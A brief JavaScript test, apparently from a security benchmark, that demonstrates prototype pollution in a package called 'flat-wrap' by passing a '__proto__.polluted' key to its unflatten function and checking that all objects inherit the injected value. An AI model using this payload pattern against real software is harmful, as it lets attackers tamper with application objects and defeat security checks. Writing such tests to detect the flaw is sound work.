test("prototype pollution in flat-wrap", () => {
  const { unflatten } = require("flat-wrap");

  expect({}.polluted).toBe(undefined);

  unflatten({
    "__proto__.polluted": process.env.SECBENCH_PAYLOAD || ("yes"),
  });

  expect({}.polluted).toBe("yes");
});
